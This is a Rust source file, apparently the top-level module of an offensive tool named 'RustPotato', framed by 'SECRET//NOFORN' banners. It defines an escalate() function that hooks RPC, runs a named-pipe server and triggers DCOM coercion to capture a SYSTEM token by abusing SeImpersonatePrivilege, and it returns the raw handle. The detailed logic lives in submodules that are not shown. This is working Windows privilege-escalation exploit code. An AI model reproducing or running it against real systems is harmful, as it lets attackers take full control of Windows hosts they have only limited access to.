/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/

// conditional debug output for submodules
#[macro_export]
macro_rules! _print {
    ($($arg:tt)*) => {
        #[cfg(feature = "debug")]
        {
            println!($($arg)*)
        }
    };
}

pub mod win32;
pub mod def;
pub mod utils;
pub mod objref;
pub mod orcb;
pub mod token;
pub mod trigger;
pub mod context;

use context::RustPotatoContext;

/// escalate to SYSTEM via DCOM/named-pipe coercion (SeImpersonatePrivilege)
pub fn escalate() -> Option<*mut std::ffi::c_void> {
    let mut ctx = RustPotatoContext::new();

    ctx.init_context()?;
    ctx.setup_rpc_context()?;
    ctx.hook_rpc()?;
    ctx.start_pipe_server()?;
    ctx.start_trigger()?;
    ctx.stop_pipe_server();
    ctx.restore_hook_rpc();

    let identity = ctx.system_identity.as_ref()?;
    let guard = identity.lock().ok()?;
    let raw_handle = guard.get_token()?;
    Some(raw_handle.as_handle() as *mut std::ffi::c_void)
}

/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/
